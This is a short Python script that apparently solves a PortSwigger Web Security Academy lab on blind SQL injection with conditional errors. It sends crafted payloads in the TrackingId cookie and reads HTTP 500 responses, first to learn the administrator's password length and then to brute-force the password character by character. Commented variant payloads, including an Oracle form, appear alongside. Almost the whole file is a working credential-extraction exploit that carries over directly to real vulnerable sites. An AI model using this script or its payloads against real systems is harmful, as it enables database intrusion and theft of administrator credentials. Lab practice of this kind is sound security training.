# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

import requests
import string
import time

URL = "https://....web-security-academy.net"
TRACKING_ID = "..."
alphabet = string.digits + string.ascii_letters
password_length = 0
password = ''


# Determine the password length
# ' AND (SELECT CASE WHEN (LENGTH(password) = {}) THEN 1/0 ELSE 1 END FROM users WHERE username='administrator') = 1--
# ' AND (SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator')) = {}) THEN 1/0 ELSE 1 END FROM dual) = 1--

while True:

    injection = f"' AND (SELECT CASE WHEN (LENGTH(password) = {password_length}) THEN 1/0 ELSE 1 END FROM users WHERE username='administrator') = 1--"
    cookies = {
        "TrackingId": TRACKING_ID + injection
    }

    r = requests.get(url = URL, cookies = cookies)

    if r.status_code == 500:
        break
    else:
        password_length += 1
        time.sleep(0.25)

print("Password length: ", password_length)


# Brute-force the password
# ' AND (SELECT CASE WHEN (SUBSTR(password, {}, 1) = {}) THEN 1/0 ELSE 1 END FROM users WHERE username='administrator') = 1--
# ' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'), {}, 1) = '{}') THEN 1/0 ELSE 1 END FROM dual) = 1--

while len(password) < password_length:

    for c in alphabet:

        injection = f"' AND (SELECT CASE WHEN (SUBSTR(password, {len(password) + 1}, 1) = '{c}') THEN 1/0 ELSE 1 END FROM users WHERE username='administrator') = 1--"
        cookies = {
            "TrackingId": TRACKING_ID + injection
        }

        r = requests.get(url = URL, cookies = cookies)

        if r.status_code == 500:
            password += c
            print(password)
            break
        else:
            time.sleep(0.25)

print("Password: ", password)
